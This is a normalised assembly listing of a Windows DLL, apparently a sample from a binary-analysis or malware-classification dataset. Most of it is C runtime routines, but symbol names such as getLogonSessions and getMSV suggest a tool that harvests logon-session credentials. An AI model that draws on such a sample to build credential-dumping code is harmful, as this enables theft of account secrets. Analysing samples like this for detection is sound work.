jg r-xdata
lea ecx [ ebp + ecx - 0x20 ]
add eax 0x8
mov [ ebp - 0x70 ] ecx
mov [ ebp - 0x6c ] eax
cmp [ eax + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x20 ] esi
jne r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr edi 0x1
or edi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] edi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x50 ]
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x40 ]
add ecx ecx
mov [ ebp - 0x50 ] edx
test edx edx
jle r-xdata
add edi 0xc002
test di di
jle r-xdata
mov [ ebp - 0x5c ] 0x1
cmp eax ecx
jae r-xdata
cmp [ eax ] esi
je r-xdata
xor eax eax
mov [ ebp - 0x16 ] ax
jmp r-xdata
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp si ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] eax
je r-xdata
add edi 0xffff
test di di
jns r-xdata
test [ ebp - 0x8 ] 0x80000000
jne r-xdata
add [ ebp - 0x70 ] 0x2
sub [ ebp - 0x6c ] 0x2
dec [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
jg r-xdata
inc [ esi ]
cmp [ ebp - 0x5c ] 0x0
mov [ esi - 0x4 ] eax
je r-xdata
mov [ ebp - 0x18 ] esi
mov ax [ ebp - 0xe ]
or esi [ ebp - 0x5c ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] si
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x5c ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
jmp r-xdata
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
mov eax 0x8000
cmp [ ebp - 0x10 ] ax
ja r-xdata
mov eax edi
neg eax
movzx eax ax
add edi eax
test di di
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
shr edx 0x1f
add eax eax
or eax edx
add edi 0xffff
mov [ ebp - 0x8 ] eax
test di di
jg r-xdata
mov eax [ ebp - 0x70 ]
movzx ecx [ eax ]
mov eax [ ebp - 0x6c ]
movzx eax [ eax ]
mov edx [ esi - 0x4 ]
imul ecx eax
and [ ebp - 0x5c ] 0x0
lea eax [ edx + ecx ]
cmp eax edx
jb r-xdata
mov eax [ ebp - 0x44 ]
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc esi
jmp r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr esi 0x1
or esi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] esi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x48 ]
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp di ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x48 ] eax
je r-xdata
mov ax [ ebp - 0xe ]
or edi [ ebp - 0x58 ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] di
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x58 ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc edi
jmp r-xdata
sub_10027a49
xor eax eax
test bl 0x10
je r-xdata
test bl 0x8
je r-xdata
inc eax
test bl 0x4
je r-xdata
or eax 0x4
test bl 0x2
je r-xdata
or eax 0x8
test bl 0x1
je r-xdata
or eax 0x10
test ebx 0x80000
je r-xdata
or eax 0x20
mov ecx ebx
mov edx 0x300
and ecx edx
push esi
mov esi 0x200
je r-xdata
or eax 0x2
mov ecx ebx
and ecx 0x30000
je r-xdata
cmp ecx 0x100
je r-xdata
or eax edx
cmp ecx 0x10000
jne r-xdata
or eax 0x400
cmp ecx esi
je r-xdata
retn
or eax 0x1000
pop esi
test ebx 0x40000
je r-xdata
or eax esi
jmp r-xdata
or eax 0x800
jmp r-xdata
cmp ecx edx
jne r-xdata
or eax 0xc00
jmp r-xdata
sub_10027ad7
xor eax eax
test dl 0x10
je r-xdata
push ebx
push esi
push edi
mov ebx 0x200
test dl 0x8
je r-xdata
mov eax 0x80
test dl 0x4
je r-xdata
or eax ebx
test dl 0x2
je r-xdata
or eax 0x400
test dl 0x1
je r-xdata
or eax 0x800
mov edi 0x100
test edx 0x80000
je r-xdata
or eax 0x1000
mov ecx edx
mov esi 0x300
and ecx esi
je r-xdata
or eax edi
mov ecx 0x3000000
pop edi
and edx ecx
pop esi
pop ebx
cmp edx 0x1000000
je r-xdata
cmp ecx edi
je r-xdata
or eax 0x8040
cmp edx 0x2000000
je r-xdata
or eax 0x2000
cmp ecx ebx
je r-xdata
or eax 0x40
retn
cmp edx ecx
jne r-xdata
or eax 0x4000
jmp r-xdata
cmp ecx esi
jne r-xdata
retn
or eax 0x8000
retn
or eax 0x6000
jmp r-xdata
sub_10027b77
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
fwait
fnstcw [ ebp - 0x4 ]
mov bx [ ebp - 0x4 ]
xor edx edx
test bl 0x1
je r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test bl 0x8
je r-xdata
or edx 0x8
test bl 0x10
je r-xdata
or edx 0x4
test bl 0x20
je r-xdata
or edx 0x2
test bl 0x2
je r-xdata
or edx 0x1
movzx ecx bx
mov eax ecx
mov esi 0xc00
and eax esi
mov edi 0x300
je r-xdata
or edx 0x80000
and ecx edi
je r-xdata
cmp eax 0x400
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
mov edi [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax edi
not eax
and eax edx
and ecx edi
or eax ecx
mov [ ebp + 0xc ] eax
cmp eax edx
je r-xdata
or edx 0x40000
movzx eax bx
test eax 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
xor esi esi
cmp [ rw-data ] esi
je r-xdata
mov ebx eax
call sub_10027a49
movzx eax ax
mov [ ebp - 0x8 ] eax
fldcw [ ebp - 0x8 ]
fwait
fnstcw [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
xor edx edx
test bl 0x1
je r-xdata
or edx edi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
and edi 0x308031f
mov [ ebp - 0x14 ] edi
stmxcsr [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
test al al
jns r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test eax 0x200
je r-xdata
push 0x10
pop esi
test bl 0x8
je r-xdata
or edx 0x8
test eax 0x400
je r-xdata
or esi 0x8
test bl 0x10
je r-xdata
or edx 0x4
test eax 0x800
je r-xdata
or esi 0x4
test bl 0x20
je r-xdata
or edx 0x2
test eax 0x1000
je r-xdata
or esi 0x2
test bl 0x2
je r-xdata
or edx 0x1
test eax 0x100
je r-xdata
or esi 0x1
movzx ecx bx
mov eax ecx
and eax esi
je r-xdata
or edx 0x80000
mov ecx eax
mov ebx 0x6000
and ecx ebx
je r-xdata
or esi 0x80000
and ecx 0x300
je r-xdata
cmp eax 0x400
je r-xdata
mov edi 0x8040
and eax edi
sub eax 0x40
je r-xdata
cmp ecx 0x2000
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
or esi 0x2000000
sub eax 0x7fc0
je r-xdata
or esi 0x100
cmp ecx 0x4000
je r-xdata
mov [ ebp + 0xc ] edx
mov eax edx
or edx 0x40000
test ebx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
call sub_10027ad7
push eax
mov [ ebp - 0xc ] eax
call sub_1001d488
pop ecx
stmxcsr [ ebp - 0xc ]
mov ecx [ ebp - 0xc ]
xor edx edx
test cl cl
jns r-xdata
mov eax esi
jmp r-xdata
or esi 0x3000000
jmp r-xdata
sub eax 0x40
jne r-xdata
or esi 0x200
jmp r-xdata
cmp ecx ebx
jne r-xdata
or edx 0x300
jmp r-xdata
test ecx 0x200
je r-xdata
push 0x10
pop edx
mov ecx eax
xor ecx [ ebp + 0xc ]
or eax [ ebp + 0xc ]
test ecx 0x8031f
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx eax
and eax [ ebp + 0x8 ]
not edx
and edx esi
or edx eax
cmp edx esi
jne r-xdata
or esi 0x1000000
jmp r-xdata
or esi 0x300
jmp r-xdata
test ecx 0x400
je r-xdata
or edx 0x8
or eax 0x80000000
test ecx 0x800
je r-xdata
or edx 0x4
test ecx 0x1000
je r-xdata
or edx 0x2
mov esi 0x100
test esi ecx
je r-xdata
or edx 0x1
mov eax ecx
and eax ebx
je r-xdata
or edx 0x80000
and ecx edi
sub ecx 0x40
je r-xdata
cmp eax 0x2000
je r-xdata
or edx 0x2000000
sub ecx 0x7fc0
je r-xdata
or edx esi
cmp eax 0x4000
je r-xdata
or edx 0x3000000
jmp r-xdata
sub ecx 0x40
jne r-xdata
or edx 0x200
jmp r-xdata
cmp eax ebx
jne r-xdata
mov eax edx
or edx 0x1000000
jmp r-xdata
or edx 0x300
jmp r-xdata
sub_10027e89
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0x10 ]
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x4 ] 0x404e
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
cmp [ ebp + 0xc ] ebx
jbe r-xdata
cmp [ eax + 0x8 ] ebx
jne r-xdata
xor ecx ecx
mov [ ebp + 0x10 ] ebx
mov edi [ eax + 0x8 ]
test edi 0x8000
jne r-xdata
mov edx [ eax + 0x4 ]
mov [ ebp + 0x10 ] 0x1
cmp edx [ ebp - 0x18 ]
jae r-xdata
mov cx [ ebp - 0x4 ]
pop edi
pop esi
mov [ eax + 0xa ] cx
pop ebx
leave
retn
mov ecx [ eax + 0x4 ]
mov ecx [ eax ]
add [ ebp - 0x4 ] 0xfff0
mov edi edx
mov esi ecx
shr esi 0x10
shl edx 0x10
shr edi 0x10
or edx esi
shl ecx 0x10
mov [ eax + 0x4 ] edx
mov [ eax ] ecx
cmp edi ebx
je r-xdata
mov [ eax + 0x8 ] edi
mov esi [ ebp - 0x14 ]
and [ ebp + 0x10 ] 0x0
lea ebx [ edi + esi ]
cmp ebx edi
jb r-xdata
mov esi [ ebp - 0x8 ]
and [ ebp + 0x10 ] 0x0
lea edi [ esi + 0x1 ]
cmp edi esi
jb r-xdata
cmp [ ebp + 0x10 ] 0x0
mov [ eax ] edx
je r-xdata
mov ebx [ eax ]
add [ ebp - 0x4 ] 0xffff
mov esi ecx
mov edx ebx
shr esi 0x1f
add edi edi
shr edx 0x1f
add ecx ecx
or edi esi
add ebx ebx
or ecx edx
mov [ eax ] ebx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edi
test edi 0x8000
je r-xdata
mov [ ebp + 0x10 ] 0x1
cmp ebx esi
jae r-xdata
mov [ ebp + 0x10 ] 0x1
cmp edi 0x1
jae r-xdata
add ecx [ ebp - 0x10 ]
and [ ebp - 0x8 ] 0x0
mov edi ebx
add ecx ecx
mov esi edx
shr edi 0x1f
or ecx edi
shr esi 0x1f
add ebx ebx
add edx edx
or ebx esi
mov [ eax + 0x8 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp + 0x10 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
movsx esi [ ecx ]
lea ecx [ edx + esi ]
mov [ ebp - 0x18 ] esi
cmp ecx edx
jb r-xdata
inc ecx
mov [ eax + 0x8 ] ecx
cmp [ ebp + 0x10 ] 0x0
mov [ eax + 0x4 ] ebx
je r-xdata
inc ecx
mov [ eax + 0x8 ] ecx
cmp [ ebp + 0x10 ] 0x0
mov [ eax + 0x4 ] edi
je r-xdata
mov [ ebp - 0x8 ] 0x1
cmp ecx esi
jae r-xdata
dec [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
inc [ ebp + 0x8 ]
cmp [ ebp + 0xc ] 0x0
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] edx
ja r-xdata
lea edx [ ebx + 0x1 ]
xor esi esi
cmp edx ebx
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
mov [ eax ] ecx
je r-xdata
mov esi eax
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edx ecx
lea edi [ ecx + ecx ]
shr edx 0x1f
lea ecx [ ebx + ebx ]
or ecx edx
mov edx [ ebp + 0x10 ]
and [ ebp + 0x10 ] 0x0
mov esi ebx
mov ebx ecx
mov [ ebp - 0x8 ] edi
shr esi 0x1f
add edx edx
or edx esi
mov esi [ ebp - 0x8 ]
add ecx ecx
shr edi 0x1f
or ecx edi
mov edi ecx
mov [ ebp - 0x8 ] ecx
lea ecx [ edx + edx ]
mov edx [ ebp - 0x18 ]
add esi esi
shr ebx 0x1f
or ecx ebx
add edx esi
mov [ eax ] esi
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] ecx
cmp edx esi
jb r-xdata
xor ebx ebx
xor esi esi
inc esi
cmp edx 0x1
jae r-xdata
mov edx [ ebp - 0xc ]
inc edx
mov [ ebp + 0x10 ] edx
mov [ eax + 0x8 ] edx
mov ebx edx
mov [ eax + 0x4 ] edx
test esi esi
je r-xdata
sub_100280a3
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
or edi 0xffffffff
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_10017e85
mov [ eax ] 0x16
call sub_1001b8e4
or eax edi
jmp r-xdata
and [ esi + 0xc ] 0x0
mov eax edi
push esi
call sub_10026cf8
push esi
mov edi eax
call sub_100283bd
push esi
call sub_10023a80
push eax
call sub_100282f9
add esp 0x10
test eax eax
jns r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
call sub_1001750d
and [ esi + 0x1c ] 0x0
pop ecx
sub_10028110
push 0xc
push r--data
call sub_1001de70
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_10017e85
mov [ eax ] 0x16
call sub_1001b8e4
or eax 0xffffffff
jmp r-xdata
push esi
call sub_100239a2
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_100280a3
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002817c
jmp r-xdata
and [ esi + 0xc ] 0x0
call sub_1001deb5
retn
mov eax [ ebp - 0x1c ]
sub_10028184
push 0x10
push r--data
call sub_1001de70
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_10017e85
mov [ eax ] 0x9
call sub_10017e85
mov [ eax ] 0x9
call sub_1001b8e4
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_1001deb5
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ esi + eax + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_10026a24
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x1
je r-xdata
call sub_10017e85
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_100269bb
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
and [ ebp - 0x1c ] 0x0
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10028255
mov eax [ ebp - 0x1c ]
call sub_10017e98
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_1002825d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_100269bb
pop ecx
cmp eax 0xffffffff
je r-xdata
xor edi edi
mov eax [ rw-data ]
cmp esi 0x1
jne r-xdata
xor eax eax
push edi
call sub_10017eab
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push esi
call sub_100269bb
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_100269bb
push 0x1
mov edi eax
call sub_100269bb
pop ecx
pop ecx
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_10026935
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
pop ecx
mov [ eax + esi + 0x4 ] 0x0
test edi edi
je r-xdata
sub_100282f9
push 0x10
push r--data
call sub_1001de70
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_10017e98
and [ eax ] 0x0
call sub_10017e85
mov [ eax ] 0x9
call sub_10017e98
and [ eax ] 0x0
call sub_10017e85
mov [ eax ] 0x9
call sub_1001b8e4
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_1001deb5
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_10026a24
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_10017e85
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_1002825d
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100283b5
mov eax [ ebp - 0x1c ]
sub_100283bd
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
pop ebp
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_1001750d
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_10001000
mov [ ecx ] r--data
jmp sub_10016fb6
sub_10001040
retn
sub_1000278f
mov edx [ ebp - 0x14 ]
push edx
call sub_100173b1
add esp 0x4
push 0x0
push 0x0
call sub_10017df7
int3
sub_10002860
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push eax
mov esi ecx
call sub_10017006
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10002e20
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push eax
mov esi ecx
call sub_10017006
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10002eb0
mov [ ecx ] r--data
retn
sub_10003110
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add ecx 0x8
push ecx
push eax
call sub_1001643b
add esp 0x8
pop ebp
retn 0x4
sub_10003170
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add ecx 0x8
push ecx
push eax
call sub_100164a1
add esp 0x8
pop ebp
retn 0x4
j_sub_10016fb6#2
jmp sub_10016fb6
sub_100038f0
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
pop esi
retn
push eax
call sub_1001750d
add esp 0x4
sub_10003910
mov eax [ ecx - 0x8 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x8 ] r--data
retn
sub_10003970
push ecx
mov [ ecx ] r--data
call sub_10015fc5
pop ecx
retn
sub_10003980
mov eax [ ecx - 0x10 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x10 ] r--data
retn
sub_10003990
mov eax [ eax ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
mov eax [ edx + eax + 0x38 ]
test eax eax
je r-xdata
retn
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x8 ]
jmp eax
sub_10003ac0
add ecx 0x4
jmp sub_10016429
sub_10003ad0
add ecx 0x4
jmp sub_10016432
sub_10003ae0
mov eax 0xffff
retn 0x4
sub_10003af0
xor eax eax
xor edx edx
retn
sub_10003b00
mov eax 0xffff
retn
sub_10003d90
mov eax ecx
retn 0xc
sub_10003da0
xor eax eax
retn
sub_10003db0
retn 0x4
sub_10003dc0
cmp [ eax + 0x14 ] 0x8
jb r-xdata
retn
mov eax [ eax ]
sub_10003f70
mov eax [ ecx - 0x18 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x18 ] r--data
mov eax [ ecx - 0x8 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x8 ] r--data
mov eax [ ecx - 0x18 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x18 ] r--data
retn
sub_10004910
mov ecx [ eax + 0x20 ]
cmp [ ecx ] 0x0
je r-xdata
xor eax eax
cdq
retn
mov edx [ eax + 0x30 ]
mov eax [ edx ]
cdq
retn
sub_10004930
mov ecx [ eax + 0x24 ]
cmp [ ecx ] 0x0
je r-xdata
xor eax eax
cdq
retn
mov edx [ eax + 0x34 ]
mov eax [ edx ]
cdq
retn
sub_10005860
push ebp
mov ebp esp
push ecx
add eax 0x18
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x0
call sub_10005880
mov eax esi
mov esp ebp
pop ebp
retn
sub_10006580
mov eax r-xdata
retn
sub_10006fc0
push ebp
mov ebp esp
push ecx
mov eax [ ecx ]
mov edx [ eax + 0x10 ]
push esi
mov [ ebp - 0x4 ] 0x0
call edx
mov eax esi
mov esp ebp
pop ebp
retn
sub_10006fe0
push ebp
mov ebp esp
push ecx
mov eax [ ecx ]
mov edx [ eax + 0x14 ]
push esi
mov [ ebp - 0x4 ] 0x0
call edx
mov eax esi
mov esp ebp
pop ebp
retn
sub_10007000
mov ax [ ecx + 0xc ]
retn
sub_10007010
mov ax [ ecx + 0xe ]
retn
sub_10007530
push ebp
mov ebp esp
push ecx
mov eax [ ecx ]
mov edx [ eax + 0xc ]
push esi
mov [ ebp - 0x4 ] 0x0
call edx
mov eax esi
mov esp ebp
pop ebp
retn
sub_10007550
mov eax [ esi + 0x8 ]
push eax
call sub_1001748d
mov ecx [ esi + 0x10 ]
push ecx
call sub_1001748d
mov edx [ esi + 0x14 ]
push edx
call sub_1001748d
add esp 0xc
retn
sub_10008252
mov esi [ ebp + 0x8 ]
call sub_10007550
xor ebx ebx
push ebx
push ebx
call sub_10017df7
int3
getLogonSessions
push ebp
mov ebp esp
pop ebp
jmp getMSV
sub_100111dd
mov edx [ ebp - 0x14 ]
push edx
call sub_100173b1
add esp 0x4
push 0x0
push 0x0
call sub_10017df7
int3
getDescription
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push 0x48
mov eax r--data
call sub_10001f10
mov al 0x1
pop ebp
retn
j_sub_10016fb6
jmp sub_10016fb6
sub_10015ce2
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_10017006
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10015d2f
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_10017006
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10015d7c
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_10017006
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10015dba
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_1001740d
sub_10015e4c
mov edi edi
push esi
call sub_100182e0
mov esi [ eax + 0x8 ]
call sub_100182ba
mov edx eax
mov eax esi
pop esi
retn
sub_10015ee5
mov eax [ ecx + 0x4 ]
retn
sub_10015ee9
mov eax [ ecx + 0x8 ]
retn
sub_10015eed
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x8
sub_10015f01
mov eax rw-data
retn
sub_10016003
mov ecx [ ecx + 0x4 ]
call sub_10002e70
test eax eax
je r-xdata
retn
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_1001608f
mov eax [ rw-data ]
retn
sub_100163e1
mov eax [ ecx ]
cmp eax 0x4
jge r-xdata
retn
imul eax eax 0x18
add eax rw-data
push eax
call sub_10016eb3
pop ecx
sub_10016412
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_10016e93
push [ esi ]
call sub_100173b1
pop ecx
pop ecx
pop esi
retn
sub_10016429
push [ ecx ]
call sub_10016ea3
pop ecx
retn
sub_10016432
push [ ecx ]
call sub_10016eb3
pop ecx
retn
sub_10016626
push r-xdata
call sub_10018d37
neg eax
sbb eax eax
pop ecx
and eax 0x18
retn
sub_10016851
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x24 ] ecx
pop ebp
retn
sub_10016867
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax ] sub_10016851
mov [ eax + 0xc ] ecx
pop ebp
retn
j_sub_1001a4cd
jmp sub_1001a4cd
sub_10016c16
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_10016dbd
sub_10016e58
jmp r-xdata
cmp [ rw-data ] 0xa
jb r-xdata
mov eax [ rw-data ]
mov eax [ eax * 4 + rw-data ]
inc [ rw-data ]
push eax
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
retn
call eax
sub_10016e83
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ InitializeCriticalSection@IAT ]
pop ebp
retn
sub_10016e93
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ DeleteCriticalSection@IAT ]
pop ebp
retn
sub_10016ea3
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ EnterCriticalSection@IAT ]
pop ebp
retn
sub_10016eb3
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_10016ed2
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov ecx [ ecx ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0x0
pop ebp
retn 0x8
sub_10016eef
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_10016f3c
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
retn
